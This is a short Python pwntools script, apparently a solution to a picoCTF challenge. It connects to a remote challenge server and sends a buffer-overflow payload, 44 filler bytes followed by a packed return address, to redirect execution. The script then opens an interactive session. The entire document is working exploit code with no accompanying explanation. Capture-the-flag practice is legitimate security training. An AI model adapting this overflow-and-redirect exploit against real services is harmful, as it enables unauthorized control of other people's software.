from pwn import *

r = remote("saturn.picoctf.net" , 52734)

r.recvuntil(b"Please enter your string:")

payload = b"a"*44
payload += p32(0x080491f6)
# payload += b"\xf6\x91\x04\x08"
r.sendline(payload)

r.interactive()
